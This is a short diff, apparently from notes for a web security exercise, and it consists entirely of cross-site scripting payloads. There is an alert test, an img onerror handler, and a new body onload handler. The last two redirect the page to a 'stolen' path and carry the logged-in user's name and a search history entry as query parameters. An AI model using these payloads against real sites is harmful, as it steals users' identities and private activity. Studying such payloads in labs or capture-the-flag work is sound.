@@ -3,3 +3,6 @@
 <body onload="alert(0)">
 
 <img src=/ onerror='$(document).ready(location.pathname="stolen?user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text())' />
+
+# don't need the document onload
+<body onload='location.pathname="stolen?user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text()'>
